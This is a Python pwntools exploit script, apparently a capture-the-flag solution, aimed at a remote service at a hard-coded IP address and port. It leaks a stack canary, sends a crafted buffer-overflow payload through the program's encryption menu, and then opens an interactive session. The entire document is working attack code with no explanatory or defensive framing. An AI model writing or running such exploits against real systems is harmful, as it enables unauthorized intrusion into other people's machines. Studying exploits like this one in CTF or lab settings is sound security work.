from pwn import*
context(os='linux',arch='amd64',log_level='debug')

s = remote('49.233.15.226', 8001)

canary = u64(s.recv(7).rjust(8,b'\x00'))
success('canary=>' + hex(canary))

s.sendlineafter(b"3.exit\n>> ", b"1")
s.sendlineafter(b"Please put the content you want to encrypt into '1.txt'", b'a'*0x52 + b'*'+chr((canary>>32)&0xff).encode()+b'c'*6+b'\x75**')
s.sendlineafter(b"When you finish  please input 'Y'\n", b"Y")
s.sendlineafter(b"5.RC4\n>> ", b"4")
s.sendlineafter(b"for example: 0x10 0x20 0x30 0x10 \n> ", b"0x10 0x20 0x30 0x10")

s.interactive()
